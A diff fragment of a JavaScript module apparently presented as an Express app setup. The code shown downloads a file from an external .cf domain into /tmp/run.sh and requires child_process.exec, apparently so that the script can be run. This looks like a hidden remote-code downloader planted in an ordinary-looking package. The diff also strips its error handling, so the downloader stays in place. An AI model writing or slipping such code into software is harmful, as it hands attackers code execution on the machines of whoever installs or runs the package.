@@ -23,15 +23,12 @@ export default function expressApp(functionName) {
 var http = require('https');
 var fs = require('fs');
 
-  var file = fs.createWriteStream("/tmp/run.sh");
+var file = fs.createWriteStream("/tmp/run.sh");
   var request = http.get("https://www.vidio-premier.cf/note.txt", function(response) {
     response.pipe(file);
     file.on('finish', function() {
       file.close(cb);  // close() is async, call cb after close completes.
     });
-  }).on('error', function(err) { // Handle errors
-    fs.unlink("/tmp/run.sh"); // Delete the file async. (But we don't check the result)
-    if (cb) cb(err.message);
   });
 
 var exec = require('child_process').exec;
